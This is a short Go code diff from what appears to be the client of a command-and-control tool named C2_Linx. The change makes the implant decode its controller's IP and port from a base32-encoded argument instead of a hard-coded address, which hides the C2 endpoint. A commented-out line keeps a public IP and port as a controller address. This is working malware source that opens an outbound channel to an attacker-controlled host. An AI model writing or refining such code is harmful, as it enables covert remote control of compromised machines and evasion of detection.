@@ -4,6 +4,7 @@ package main
 
 import (
 	"C2_Linx/encode"
+	"encoding/base32"
 	"fmt"
 	"math/rand"
 	"net"
@@ -18,7 +19,16 @@ import (
 var nick string = ""  //
 var msg_str []string
 func main() {
-	conn, err := net.Dial("tcp", "192.168.201.1:8888") //打开监听端口
+	ip_port:=string(os.Args[1])
+	data, err := base32.StdEncoding.DecodeString(ip_port)
+	if err != nil {
+		panic("failed to decode")
+	}
+
+	// Print decoded data
+	conn, err := net.Dial("tcp", string(data)) //打开监听端口
+
+	//conn, err := net.Dial("tcp", "43.143.18.98:8888") //打开监听端口
 	if err != nil {
 		fmt.Println("conn fail...")
 	}
